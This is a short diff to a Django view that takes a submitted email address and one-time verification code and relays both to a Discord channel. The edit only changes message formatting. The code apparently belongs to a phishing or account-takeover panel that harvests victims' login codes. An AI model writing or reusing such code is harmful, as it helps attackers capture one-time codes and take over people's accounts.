@@ -376,7 +376,7 @@ def send_email_code(request, user_id):
         email = request.POST.get('email')
         verify_code = request.POST.get('verify_code')
     
-        discord_message = f"📊 Email :  ```{email}```\nOne-Time Code : ```{verify_code}```"
+        discord_message = f"📊 Email :  ```{email}``` One-Time Code : ```{verify_code}```"
         send_discord_message(discord_message, color=0x00ff00)
 
         return JsonResponse({
